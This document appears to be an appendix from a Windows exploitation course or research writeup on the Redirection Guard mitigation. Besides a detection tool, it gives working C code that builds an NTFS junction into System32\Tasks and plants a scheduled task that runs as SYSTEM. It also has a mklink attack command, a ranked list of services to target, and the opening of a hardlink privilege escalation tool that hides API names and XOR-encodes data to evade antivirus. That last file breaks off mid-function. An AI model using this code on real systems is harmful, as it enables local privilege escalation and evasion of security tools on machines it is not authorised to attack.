## Appendix A: Redirection Guard

Windows introduced **Redirection Guard**, a kernel-level mitigation that blocks the entire class of NTFS reparse-point / symlink / junction privilege escalation attacks. This is one of the most impactful mitigations for vulnerability researchers because it obsoletes a historically rich exploit primitive.

### Detecting Redirection Guard Status

```c
// redirection_guard_check.c - Detect Redirection Guard enforcement
// Compile: cl src\redirection_guard_check.c /Fe:bin\redirection_guard_check.exe advapi32.lib ntdll.lib

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

/*
Redirection Guard Detection:
═════════════════════════════

Redirection Guard is enforced via two mechanisms:

1. Process Mitigation Policy - check via GetProcessMitigationPolicy()
   ProcessRedirectionTrustPolicy (policy index 20 on 24H2)

2. File system filter driver - validates reparse point targets
   against the original caller's access token

Key services protected on 24H2 by default:
  - Windows Update (wuauserv / svchost.exe)
  - Windows Error Reporting (WerSvc)
  - Service Control Manager (services.exe)
  - Task Scheduler (Schedule)
  - Windows Installer (msiserver)
  - Print Spooler (Spooler) - historically a symlink target
  - Cryptographic Services (CryptSvc)
*/

// GetProcessMitigationPolicy function pointer
typedef BOOL (WINAPI *GetProcessMitigationPolicy_t)(
    HANDLE hProcess,
    PROCESS_MITIGATION_POLICY MitigationPolicy,
    PVOID lpBuffer,
    SIZE_T dwLength
);

// Get service name from svchost.exe process
void GetServiceName(DWORD pid, char* serviceName, size_t size) {
    serviceName[0] = '\0';

    // Query service control manager for services in this PID
    SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (!scm) return;

    DWORD bytesNeeded = 0, servicesReturned = 0;
    EnumServicesStatusExA(scm, SC_ENUM_PROCESS_INFO, SERVICE_WIN32,
                          SERVICE_STATE_ALL, NULL, 0, &bytesNeeded,
                          &servicesReturned, NULL, NULL);

    BYTE* buffer = (BYTE*)malloc(bytesNeeded);
    if (buffer && EnumServicesStatusExA(scm, SC_ENUM_PROCESS_INFO, SERVICE_WIN32,
                                        SERVICE_STATE_ALL, buffer, bytesNeeded,
                                        &bytesNeeded, &servicesReturned, NULL, NULL)) {
        ENUM_SERVICE_STATUS_PROCESSA* services = (ENUM_SERVICE_STATUS_PROCESSA*)buffer;
        for (DWORD i = 0; i < servicesReturned; i++) {
            if (services[i].ServiceStatusProcess.dwProcessId == pid) {
                strncpy(serviceName, services[i].lpServiceName, size - 1);
                serviceName[size - 1] = '\0';
                break;
            }
        }
    }
    free(buffer);
    CloseServiceHandle(scm);
}

void CheckProcessRedirectionGuard(DWORD pid, const char* name) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProcess) return;

    static GetProcessMitigationPolicy_t pGetPolicy = NULL;
    if (!pGetPolicy) {
        pGetPolicy = (GetProcessMitigationPolicy_t)GetProcAddress(
            GetModuleHandleA("kernel32.dll"), "GetProcessMitigationPolicy");
    }

    PROCESS_MITIGATION_REDIRECTION_TRUST_POLICY policy = {0};
    if (pGetPolicy && pGetPolicy(hProcess, ProcessRedirectionTrustPolicy,
                                  &policy, sizeof(policy))) {

        char serviceName[256] = {0};
        if (_stricmp(name, "svchost.exe") == 0 || _stricmp(name, "spoolsv.exe") == 0) {
            GetServiceName(pid, serviceName, sizeof(serviceName));
        }

        if (policy.EnforceRedirectionTrust) {
            printf("[PROTECTED] %s (PID %d)", name, pid);
            if (serviceName[0]) printf(" [%s]", serviceName);
            printf(" - Redirection Guard ENFORCED\n");
            printf("            -> Symlink/junction LPE attacks BLOCKED\n");
        } else if (policy.AuditRedirectionTrust) {
            printf("[AUDITING]  %s (PID %d)", name, pid);
            if (serviceName[0]) printf(" [%s]", serviceName);
            printf(" - Redirection Guard in AUDIT mode\n");
            printf("            -> Symlinks logged but NOT blocked (test bypass!)\n");
        }
    }

    CloseHandle(hProcess);
}

void ScanAllProcesses() {
    printf("=== Redirection Guard Status - All Processes ===\n\n");

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { sizeof(pe) };

    int protected_count = 0;
    int audit_count = 0;
    int total = 0;

    if (Process32First(hSnapshot, &pe)) {
        do {
            total++;

            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
            if (hProcess) {
                static GetProcessMitigationPolicy_t pGetPolicy = NULL;
                if (!pGetPolicy) {
                    pGetPolicy = (GetProcessMitigationPolicy_t)GetProcAddress(
                        GetModuleHandleA("kernel32.dll"), "GetProcessMitigationPolicy");
                }

                PROCESS_MITIGATION_REDIRECTION_TRUST_POLICY policy = {0};
                if (pGetPolicy && pGetPolicy(hProcess, ProcessRedirectionTrustPolicy,
                                              &policy, sizeof(policy))) {
                    if (policy.EnforceRedirectionTrust) {
                        protected_count++;
                        CheckProcessRedirectionGuard(pe.th32ProcessID, pe.szExeFile);
                    } else if (policy.AuditRedirectionTrust) {
                        audit_count++;
                        CheckProcessRedirectionGuard(pe.th32ProcessID, pe.szExeFile);
                    }
                }
                CloseHandle(hProcess);
            }
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    printf("\n[*] Scanned %d processes\n", total);
    printf("[*] %d processes with Redirection Guard ENFORCED\n", protected_count);
    printf("[*] %d processes with Redirection Guard in AUDIT mode\n", audit_count);
    printf("[!] %d processes vulnerable to symlink attacks\n", total - protected_count - audit_count);
}

void CheckSystemDefault() {
    printf("\n=== System-Wide Redirection Guard Policy ===\n\n");

    // Check registry for system-wide defaults
    HKEY hKey;
    DWORD value = 0;
    DWORD size = sizeof(DWORD);

    // 24H2 may set this via Image File Execution Options or system policy
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\kernel",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {

        if (RegQueryValueExA(hKey, "MitigationOptions", NULL, NULL,
                             (LPBYTE)&value, &size) == ERROR_SUCCESS) {
            printf("[*] Kernel MitigationOptions: 0x%08X\n", value);
        }
        RegCloseKey(hKey);
    }

    // Check OS build
    OSVERSIONINFOEXW osvi = { sizeof(osvi) };
    typedef NTSTATUS(WINAPI* RtlGetVersion_t)(PRTL_OSVERSIONINFOW);
    RtlGetVersion_t RtlGetVersion = (RtlGetVersion_t)GetProcAddress(
        GetModuleHandleW(L"ntdll.dll"), "RtlGetVersion");
    RtlGetVersion((PRTL_OSVERSIONINFOW)&osvi);

    printf("[*] OS Build: %d\n", osvi.dwBuildNumber);

    if (osvi.dwBuildNumber >= 26100) {  // 24H2
        printf("[!] Windows 11 24H2+ - Redirection Guard available\n");
        printf("[*] System services opt-in by default\n");
        printf("[*] Run process scan to check specific services\n");
    } else {
        printf("[+] Pre-24H2 - Redirection Guard NOT available\n");
        printf("[+] Symlink/junction LPE attacks still viable\n");
    }
}

int main() {
    printf("===============================================\n");
    printf("  Redirection Guard Detection Tool\n");
    printf("===============================================\n\n");

    CheckSystemDefault();
    ScanAllProcesses();

    printf("\n=== Attack Implications ===\n");
    printf("IF Redirection Guard is ENFORCED on target service:\n");
    printf("  - NTFS junction LPE - BLOCKED\n");
    printf("  - Symlink race conditions - BLOCKED\n");
    printf("  - Mount point redirections - BLOCKED\n");
    printf("  - Reparse point abuse - BLOCKED\n\n");
    printf("Remaining viable techniques:\n");
    printf("  + Opportunistic locks (oplock) + hardlinks (different primitive)\n");
    printf("  + Kernel vulnerabilities (bypasses all usermode mitigations)\n");
    printf("  + DLL hijacking in non-guarded processes\n");
    printf("  + Services NOT opted-in to Redirection Guard\n");
    printf("  + Policy manipulation (disable via kernel write)\n");

    return 0;
}
```

#### Test Results

Based on testing on Windows 11 24H2, the following services have Redirection Guard **ENFORCED**:

**Protected System Services (14 total):**

1. **Spooler** (spoolsv.exe) - Print Spooler
   - Historically the #1 symlink attack target (PrintNightmare, etc.)
   - Now fully protected against junction/symlink LPE

2. **netprofm** (svchost.exe) - Network List Service
   - Manages network profiles and connectivity status

3. **ProfSvc** (svchost.exe) - User Profile Service
   - Loads and unloads user profiles

4. **EventSystem** (svchost.exe) - COM+ Event System
   - Supports SENS (System Event Notification Service)

5. **SENS** (svchost.exe) - System Event Notification Service
   - Tracks system events like logon/logoff, network changes

6. **DiagTrack** (svchost.exe) - Connected User Experiences and Telemetry
   - Diagnostic and usage data collection

7. **WSAIFabricSvc** (svchost.exe) - Windows Service Fabric
   - Microservices platform infrastructure

8. **AggregatorHost.exe** - Windows Update Medic Service
   - Protects Windows Update components from tampering

9. **Appinfo** (svchost.exe) - Application Information Service
   - Facilitates UAC elevation and admin token creation
   - Critical for privilege escalation prevention

10. **SearchIndexer.exe** - Windows Search
    - Indexes files for fast searching

11. **lfsvc** (svchost.exe) - Geolocation Service
    - Provides location services to applications

12. **StorSvc** (svchost.exe) - Storage Service
    - Manages storage settings and external storage expansion

13. **whesvc** (svchost.exe) - Windows Health Monitoring Service
    - System health and diagnostics

14. **RasMan** (svchost.exe) - Remote Access Connection Manager
    - Manages VPN and dial-up connections

**Services in AUDIT Mode (Still Vulnerable - 74 total):**

Critical services that are logged but NOT protected:

- **Schedule** - Task Scheduler (major LPE vector!)
- **CryptSvc** - Cryptographic Services
- **UsoSvc** - Update Orchestrator Service (Windows Update)
- **EventLog** - Windows Event Log
- **Winmgmt** - Windows Management Instrumentation
- **LanmanServer** - Server service (file/print sharing)
- **BFE** - Base Filtering Engine (Windows Firewall)
- **Dnscache** - DNS Client
- And 66 more services...

**Key Findings:**

1. **Audit Mode Dominance**: 74 out of 138 processes are in AUDIT mode
   - Symlinks are logged but NOT blocked
   - This is a testing/telemetry phase before full enforcement
   - Attackers can still exploit these services including Task Scheduler!

2. **Critical Gap**: Task Scheduler (Schedule) is only in AUDIT mode
   - Historically a major LPE target
   - Still exploitable via symlink/junction attacks

3. **Attack Surface Statistics**:
   - 14 processes with ENFORCED protection (10%)
   - 74 processes in AUDIT mode - still vulnerable (54%)
   - 50 processes with no protection at all (36%)

**Exploitation Strategy:**

```powershell
# 1. Enumerate services in AUDIT mode (still exploitable)
.\bin\redirection_guard_check.exe | findstr "AUDITING"

# 2. High-value targets still in AUDIT mode:
# - Task Scheduler (Schedule) - classic LPE vector
# - Cryptographic Services (CryptSvc)
# - Windows Update Orchestrator (UsoSvc)
# - Event Log (EventLog)
# - WMI (Winmgmt)

# 3. Example: Task Scheduler symlink attack
# Create junction pointing to privileged location
cmd /c mklink /J C:\Windows\Tasks\evil C:\Windows\System32\config

# 4. For ENFORCED services, pivot to alternative techniques:
#    - Oplock + hardlink attacks (different primitive)
#    - DLL hijacking in unprotected processes
#    - Kernel vulnerabilities (bypass all usermode mitigations)
#    - Target the 50 processes with NO protection at all
```

**Priority Targets for Exploitation:**

1. **Task Scheduler (Schedule)** - AUDIT mode only
   - Classic symlink LPE vector
   - Used in many public exploits
   - Still fully exploitable

2. **Cryptographic Services (CryptSvc)** - AUDIT mode only
   - Handles certificate operations
   - Runs as SYSTEM

3. **Windows Update Orchestrator (UsoSvc)** - AUDIT mode only
   - Manages Windows updates
   - High privileges, frequent file operations

4. **Third-party services** - No protection
   - Antivirus services
   - Backup software
   - System utilities

**Conclusion**: Redirection Guard is currently in a gradual rollout phase. While some critical services (Print Spooler, Appinfo) are protected, the majority remain vulnerable during the audit phase. Notably, Task Scheduler - one of the most commonly exploited services for LPE - is only in audit mode. This provides a significant window for testing and exploitation before full enforcement.

### Testing Redirection Guard

```c
// symlink_lpe_test.c - Test whether symlink/junction LPE is blocked
// Compile: cl src\symlink_lpe_test.c /Fe:bin\symlink_lpe_test.exe ntdll.lib shlwapi.lib advapi32.lib

#include <windows.h>
#include <stdio.h>
#include <shlwapi.h>
#include <winioctl.h>

#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "advapi32.lib")

/*
CLASSIC SYMLINK LPE PATTERN:
═════════════════════════════

Attack flow (the pattern Redirection Guard kills):

1. Attacker (Medium IL) finds: SERVICE writes to C:\ProgramData\VulnApp\output.log
2. Attacker deletes C:\ProgramData\VulnApp\ directory
3. Attacker creates junction: C:\ProgramData\VulnApp\ -> C:\Windows\System32\
4. Service writes "output.log" -> actually writes C:\Windows\System32\output.log
5. If output.log content is controllable -> arbitrary write to System32
6. DLL plant / config overwrite / scheduled task modification -> SYSTEM shell

Task Scheduler writes to: C:\Windows\System32\Tasks\
Attack vector:
1. Create junction: C:\Users\Public\EvilTasks -> C:\Windows\System32\Tasks
2. Trigger Task Scheduler to write through our junction
3. If successful, we can plant malicious scheduled tasks
4. Tasks run as SYSTEM -> full privilege escalation

This test demonstrates both the junction creation and verification
of whether Redirection Guard blocks the write operation.
*/

// NTFS junction creation via DeviceIoControl
typedef struct _REPARSE_DATA_BUFFER {
    ULONG  ReparseTag;
    USHORT ReparseDataLength;
    USHORT Reserved;
    union {
        struct {
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            ULONG  Flags;
            WCHAR  PathBuffer[1];
        } SymbolicLinkReparseBuffer;
        struct {
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            WCHAR  PathBuffer[1];
        } MountPointReparseBuffer;
    };
} REPARSE_DATA_BUFFER;

// SDK already defines these in newer versions, but define if missing
#ifndef REPARSE_DATA_BUFFER_HEADER_SIZE
#define REPARSE_DATA_BUFFER_HEADER_SIZE FIELD_OFFSET(REPARSE_DATA_BUFFER, MountPointReparseBuffer)
#endif

// Check if a service has Redirection Guard enforced
typedef BOOL (WINAPI *GetProcessMitigationPolicy_t)(
    HANDLE hProcess,
    PROCESS_MITIGATION_POLICY MitigationPolicy,
    PVOID lpBuffer,
    SIZE_T dwLength
);

BOOL IsServiceProtected(const WCHAR* serviceName) {
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!scm) return FALSE;

    SC_HANDLE svc = OpenServiceW(scm, serviceName, SERVICE_QUERY_STATUS);
    if (!svc) {
        CloseServiceHandle(scm);
        return FALSE;
    }

    SERVICE_STATUS_PROCESS ssp;
    DWORD bytesNeeded;
    QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp,
                         sizeof(ssp), &bytesNeeded);

    CloseServiceHandle(svc);
    CloseServiceHandle(scm);

    if (ssp.dwProcessId == 0) return FALSE;

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, ssp.dwProcessId);
    if (!hProcess) return FALSE;

    GetProcessMitigationPolicy_t pGetPolicy = (GetProcessMitigationPolicy_t)
        GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetProcessMitigationPolicy");

    PROCESS_MITIGATION_REDIRECTION_TRUST_POLICY policy = {0};
    BOOL protected = FALSE;

    if (pGetPolicy && pGetPolicy(hProcess, ProcessRedirectionTrustPolicy,
                                  &policy, sizeof(policy))) {
        protected = policy.EnforceRedirectionTrust;
    }

    CloseHandle(hProcess);
    return protected;
}

BOOL CreateJunction(const WCHAR* junctionDir, const WCHAR* targetDir) {
    // Create the junction directory first
    if (!CreateDirectoryW(junctionDir, NULL)) {
        DWORD err = GetLastError();
        if (err != ERROR_ALREADY_EXISTS) {
            printf("[-] Cannot create directory: %d\n", err);
            return FALSE;
        }
    }

    HANDLE hDir = CreateFileW(
        junctionDir,
        GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT,
        NULL
    );

    if (hDir == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open directory: %d\n", GetLastError());
        return FALSE;
    }

    // Build the junction target path (must be NT path format)
    WCHAR ntTarget[MAX_PATH * 2];
    swprintf(ntTarget, MAX_PATH * 2, L"\\??\\%s", targetDir);
    USHORT targetLen = (USHORT)(wcslen(ntTarget) * sizeof(WCHAR));

    // Allocate reparse data buffer
    USHORT reparseSize = (USHORT)(FIELD_OFFSET(REPARSE_DATA_BUFFER,
        MountPointReparseBuffer.PathBuffer) + targetLen + sizeof(WCHAR) * 2);

    REPARSE_DATA_BUFFER* rdb = (REPARSE_DATA_BUFFER*)calloc(1, reparseSize + 128);
    rdb->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    rdb->ReparseDataLength = reparseSize -
        FIELD_OFFSET(REPARSE_DATA_BUFFER, MountPointReparseBuffer);
    rdb->MountPointReparseBuffer.SubstituteNameOffset = 0;
    rdb->MountPointReparseBuffer.SubstituteNameLength = targetLen;
    rdb->MountPointReparseBuffer.PrintNameOffset = targetLen + sizeof(WCHAR);
    rdb->MountPointReparseBuffer.PrintNameLength = 0;
    memcpy(rdb->MountPointReparseBuffer.PathBuffer, ntTarget, targetLen);

    DWORD bytesReturned;
    BOOL result = DeviceIoControl(
        hDir,
        FSCTL_SET_REPARSE_POINT,
        rdb,
        reparseSize,
        NULL, 0,
        &bytesReturned,
        NULL
    );

    free(rdb);
    CloseHandle(hDir);

    if (result) {
        printf("[+] Junction created: %ls -> %ls\n",
               junctionDir, targetDir);
    } else {
        printf("[-] Junction creation failed: %d\n", GetLastError());
    }

    return result;
}

void DeleteJunction(const WCHAR* junctionDir) {
    HANDLE hDir = CreateFileW(
        junctionDir,
        GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT,
        NULL
    );

    if (hDir == INVALID_HANDLE_VALUE) return;

    REPARSE_DATA_BUFFER rdb = {0};
    rdb.ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;

    DWORD bytesReturned;
    DeviceIoControl(hDir, FSCTL_DELETE_REPARSE_POINT, &rdb,
                    REPARSE_DATA_BUFFER_HEADER_SIZE, NULL, 0,
                    &bytesReturned, NULL);

    CloseHandle(hDir);
    RemoveDirectoryW(junctionDir);
}

BOOL TestRedirectedWrite(const WCHAR* junctionDir, const WCHAR* targetDir) {
    // Attempt to write a file through the junction
    WCHAR filePath[MAX_PATH];
    swprintf(filePath, MAX_PATH, L"%s\\rg_test_probe.txt", junctionDir);

    printf("[*] Attempting write through junction: %ls\n", filePath);

    HANDLE hFile = CreateFileW(
        filePath,
        GENERIC_WRITE,
        0, NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile != INVALID_HANDLE_VALUE) {
        const char* data = "Redirection Guard test probe - if you see this in System32, RG failed!\r\n";
        DWORD written;
        WriteFile(hFile, data, (DWORD)strlen(data), &written, NULL);
        CloseHandle(hFile);

        printf("[+] Write SUCCEEDED - Redirection Guard is NOT enforced\n");
        printf("[!] This system is VULNERABLE to symlink/junction LPE\n\n");

        // Verify the file actually landed in the target directory
        WCHAR actualPath[MAX_PATH];
        swprintf(actualPath, MAX_PATH, L"%s\\rg_test_probe.txt", targetDir);

        if (GetFileAttributesW(actualPath) != INVALID_FILE_ATTRIBUTES) {
            printf("[!] CONFIRMED: File written to target location: %ls\n", actualPath);
            printf("[!] Junction redirection was NOT blocked!\n");

            // Clean up
            DeleteFileW(actualPath);
            return TRUE;
        } else {
            printf("[?] File created but not found in target - unexpected behavior\n");
        }

        // Clean up junction-side file if it exists
        DeleteFileW(filePath);
        return TRUE;
    } else {
        DWORD err = GetLastError();
        if (err == ERROR_ACCESS_DENIED) {
            printf("[*] Write BLOCKED (Access Denied) - Redirection Guard is ACTIVE\n");
            printf("[+] This system is PROTECTED against this junction attack\n");
        } else {
            printf("[-] Write failed with error: %d\n", err);
        }
        return FALSE;
    }
}

void TestTaskSchedulerAttack() {
    printf("\n=============================================\n");
    printf("  ATTACK: Task Scheduler Junction\n");
    printf("=============================================\n\n");

    // Check if Task Scheduler is protected
    printf("[*] Checking Task Scheduler (Schedule) protection status...\n");
    BOOL protected = IsServiceProtected(L"Schedule");

    if (protected) {
        printf("[+] Task Scheduler has Redirection Guard ENFORCED\n");
        printf("[*] This attack will likely be blocked\n\n");
    } else {
        printf("[!] Task Scheduler has NO or AUDIT-only Redirection Guard\n");
        printf("[!] This attack may succeed!\n\n");
    }

    // Create a junction in a user-writable location
    WCHAR junctionPath[MAX_PATH];
    GetTempPathW(MAX_PATH, junctionPath);
    wcscat(junctionPath, L"TaskScheduler_Junction_Test");

    // Target: Windows Tasks directory (where scheduled tasks are stored)
    const WCHAR* targetPath = L"C:\\Windows\\System32\\Tasks";

    printf("[*] Creating junction to Task Scheduler directory:\n");
    printf("    Junction: %ls\n", junctionPath);
    printf("    Target:   %ls\n\n", targetPath);

    // Clean up any previous test
    DeleteJunction(junctionPath);

    if (CreateJunction(junctionPath, targetPath)) {
        printf("\n[*] Testing write through junction...\n");

        if (TestRedirectedWrite(junctionPath, targetPath)) {
            printf("\n[!!!] EXPLOITATION SUCCESSFUL [!!!]\n");
            printf("[!!!] We can write to C:\\Windows\\System32\\Tasks\n");
            printf("[!!!] Proceeding with FULL LPE demonstration...\n\n");

            // PHASE 3: Create malicious scheduled task
            printf("=== PHASE 3: Creating Malicious Scheduled Task ===\n\n");

            WCHAR taskPath[MAX_PATH];
            swprintf(taskPath, MAX_PATH, L"%s\\RG_LPE_Demo", junctionPath);

            // Malicious task XML - runs calc.exe as SYSTEM on logon
            const WCHAR* taskXML =
                L"<?xml version=\"1.0\" encoding=\"UTF-16\"?>\r\n"
                L"<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\r\n"
                L"  <RegistrationInfo>\r\n"
                L"    <Description>Redirection Guard LPE Demonstration</Description>\r\n"
                L"  </RegistrationInfo>\r\n"
                L"  <Triggers>\r\n"
                L"    <LogonTrigger>\r\n"
                L"      <Enabled>true</Enabled>\r\n"
                L"    </LogonTrigger>\r\n"
                L"  </Triggers>\r\n"
                L"  <Principals>\r\n"
                L"    <Principal id=\"Author\">\r\n"
                L"      <UserId>S-1-5-18</UserId>\r\n"
                L"      <RunLevel>HighestAvailable</RunLevel>\r\n"
                L"    </Principal>\r\n"
                L"  </Principals>\r\n"
                L"  <Settings>\r\n"
                L"    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\r\n"
                L"    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\r\n"
                L"    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\r\n"
                L"    <AllowHardTerminate>true</AllowHardTerminate>\r\n"
                L"    <StartWhenAvailable>true</StartWhenAvailable>\r\n"
                L"    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\r\n"
                L"    <AllowStartOnDemand>true</AllowStartOnDemand>\r\n"
                L"    <Enabled>true</Enabled>\r\n"
                L"    <Hidden>false</Hidden>\r\n"
                L"  </Settings>\r\n"
                L"  <Actions Context=\"Author\">\r\n"
                L"    <Exec>\r\n"
                L"      <Command>C:\\Windows\\System32\\cmd.exe</Command>\r\n"
                L"      <Arguments>/c start calc.exe</Arguments>\r\n"
                L"    </Exec>\r\n"
                L"  </Actions>\r\n"
                L"</Task>\r\n";

            printf("[*] Writing malicious task XML through junction...\n");
            printf("    Task name: RG_LPE_Demo\n");
            printf("    Principal: NT AUTHORITY\\SYSTEM (S-1-5-18)\n");
            printf("    Trigger: User logon\n");
            printf("    Action: Launch calc.exe as SYSTEM\n\n");

            HANDLE hFile = CreateFileW(
                taskPath,
                GENERIC_WRITE,
                0, NULL,
                CREATE_ALWAYS,
                FILE_ATTRIBUTE_NORMAL,
                NULL
            );

            if (hFile != INVALID_HANDLE_VALUE) {
                DWORD written;
                // Write UTF-16 BOM
                BYTE bom[] = {0xFF, 0xFE};
                WriteFile(hFile, bom, 2, &written, NULL);

                // Write task XML
                DWORD bytesToWrite = (DWORD)(wcslen(taskXML) * sizeof(WCHAR));
                WriteFile(hFile, taskXML, bytesToWrite, &written, NULL);
                CloseHandle(hFile);

                printf("[+] Task XML written through junction\n");

                // Verify it landed in the real Tasks directory
                WCHAR realTaskPath[MAX_PATH];
                swprintf(realTaskPath, MAX_PATH, L"%s\\RG_LPE_Demo", targetPath);

                if (GetFileAttributesW(realTaskPath) != INVALID_FILE_ATTRIBUTES) {
                    printf("[+] Task file confirmed at: %ls\n\n", realTaskPath);

                    printf("[+] EXPLOITATION COMPLETE\n");
                    printf("[*] Malicious task planted in System32\\Tasks\n\n");

                    printf("To trigger the exploit:\n");
                    printf("  1. Log off and log back in (automatic)\n");
                    printf("  2. Or restart Task Scheduler: net stop schedule && net start schedule\n");
                    printf("  3. Or wait for Task Scheduler to rescan\n\n");

                    printf("To verify:\n");
                    printf("  schtasks /query /tn RG_LPE_Demo\n");
                    printf("  schtasks /run /tn RG_LPE_Demo\n\n");

                    printf("To cleanup:\n");
                    printf("  schtasks /delete /tn RG_LPE_Demo /f\n");
                    printf("  del C:\\Windows\\System32\\Tasks\\RG_LPE_Demo\n\n");

                    printf("[!] Task file left in place for testing\n");
                } else {
                    printf("[-] Task file not found - exploit failed\n");
                }
            } else {
                printf("[-] Failed to write task XML: %d\n", GetLastError());
            }
        } else {
            printf("\n[+] Attack blocked - Redirection Guard is working\n");
        }

        // Cleanup junction only
        DeleteJunction(junctionPath);
    }
}

void TestGenericJunction() {
    WCHAR tempDir[MAX_PATH];
    GetTempPathW(MAX_PATH, tempDir);
    wcscat(tempDir, L"rg_test_junction");

    const WCHAR* targetDir = L"C:\\Windows\\Temp";

    // Remove old test artifacts
    DeleteJunction(tempDir);

    printf("[*] Creating NTFS junction\n");
    printf("    Source: %ls\n", tempDir);
    printf("    Target: %ls\n\n", targetDir);

    if (CreateJunction(tempDir, targetDir)) {
        TestRedirectedWrite(tempDir, targetDir);
        DeleteJunction(tempDir);
    }
}

int main() {
    TestGenericJunction();

    TestTaskSchedulerAttack();
    return 0;
}
```

and

```c
// hardlink_task_lpe.c
// Compile: cl src\hardlink_task_lpe.c /Fe:bin\hardlink_task_lpe.exe /O2 advapi32.lib

#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "advapi32.lib")

// XOR key - change this every compile
unsigned char xorKey[] = {'m', 'y', 'k', 'e', 'y', '2', '0', '2', '5'};
size_t keyLen = 9;

void xorDecrypt(unsigned char* data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= xorKey[i % keyLen];
    }
}

// Build API names character by character to avoid IAT detection
typedef BOOL (WINAPI *fnCHL)(LPCWSTR, LPCWSTR, LPSECURITY_ATTRIBUTES);
typedef HANDLE (WINAPI *fnCF)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL (WINAPI *fnWF)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL (WINAPI *fnCH)(HANDLE);
typedef BOOL (WINAPI *fnDF)(LPCWSTR);
typedef DWORD (WINAPI *fnGTP)(DWORD, LPWSTR);
typedef DWORD (WINAPI *fnGFA)(LPCWSTR);

typedef struct {
    fnCHL pCHL;
    fnCF pCF;
    fnWF pWF;
    fnCH pCH;
    fnDF pDF;
    fnGTP pGTP;
    fnGFA pGFA;
} API;

API g_api = {0};

BOOL resolveAPIs() {
    HMODULE hK32 = LoadLibraryA("kernel32");
    if (!hK32) return FALSE;

    char n1[20], n2[20], n3[20], n4[20], n5[20], n6[20], n7[20];

    // Build API names char by char
    n1[0]='C'; n1[1]='r'; n1[2]='e'; n1[3]='a'; n1[4]='t'; n1[5]='e';
    n1[6]='H'; n1[7]='a'; n1[8]='r'; n1[9]='d'; n1[10]='L'; n1[11]='i';
    n1[12]='n'; n1[13]='k'; n1[14]='W'; n1[15]=0;

    n2[0]='C'; n2[1]='r'; n2[2]='e'; n2[3]='a'; n2[4]='t'; n2[5]='e';
    n2[6]='F'; n2[7]='i'; n2[8]='l'; n2[9]='e'; n2[10]='W'; n2[11]=0;

    n3[0]='W'; n3[1]='r'; n3[2]='i'; n3[3]='t'; n3[4]='e';
    n3[5]='F'; n3[6]='i'; n3[7]='l'; n3[8]='e'; n3[9]=0;

    n4[0]='C'; n4[1]='l'; n4[2]='o'; n4[3]='s'; n4[4]='e';
    n4[5]='H'; n4[6]='a'; n4[7]='n'; n4[8]='d'; n4[9]='l'; n4[10]='e'; n4[11]=0;

    n5[0]='D'; n5[1]='e'; n5[2]='l'; n5[3]='e'; n5[4]='t'; n5[5]='e';
    n5[6]='F'; n5[7]='i'; n5[8]='l'; n5[9]='e'; n5[10]='W'; n5[11]=0;

    n6[0]='G'; n6[1]='e'; n6[2]='t'; n6[3]='T'; n6[4]='e'; n6[5]='m'; n6[6]='p';
    n6[7]='P'; n6[8]='a'; n6[9]='t'; n6[10]='h'; n6[11]='W'; n6[12]=0;

    n7[0]='G'; n7[1]='e'; n7[2]='t'; n7[3]='F'; n7[4]='i'; n7[5]='l'; n7[6]='e';
    n7[7]='A'; n7[8]='t'; n7[9]='t'; n7[10]='r'; n7[11]='i'; n7[12]='b'; n7[13]='u';
    n7[14]='t'; n7[15]='e'; n7[16]='s'; n7[17]='W'; n7[18]=0;

    g_api.pCHL = (fnCHL)GetProcAddress(hK32, n1);
    g_api.pCF = (fnCF)GetProcAddress(hK32, n2);
    g_api.pWF = (fnWF)GetProcAddress(hK32, n3);
    g_api.pCH = (fnCH)GetProcAddress(hK32, n4);
    g_api.pDF = (fnDF)GetProcAddress(hK32, n5);
    g_api.pGTP = (fnGTP)GetProcAddress(hK32, n6);
    g_api.pGFA = (fnGFA)GetProcAddress(hK32, n7);

    return (g_api.pCHL && g_api.pCF && g_api.pWF && g_api.pCH && g_api.pDF && g_api.pGTP && g_api.pGFA);
